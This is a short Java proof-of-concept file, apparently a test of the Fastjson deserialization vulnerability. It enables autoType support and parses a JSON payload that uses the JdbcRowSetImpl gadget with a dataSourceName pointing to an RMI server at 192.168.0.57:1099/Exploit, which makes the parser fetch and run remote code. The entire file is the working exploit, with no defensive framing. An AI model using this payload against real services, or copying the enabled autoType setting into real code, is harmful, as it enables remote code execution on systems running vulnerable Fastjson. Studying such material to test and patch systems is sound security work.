import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class FastjsonTest {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String jsonString = "{\"age\":25,\"name\":\"Bob\",\"autoCommit\":true,\"dataSourceName\":\"rmi://192.168.0.57:1099/Exploit\",\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"}";
        JSON.parseObject(jsonString);
    }
}
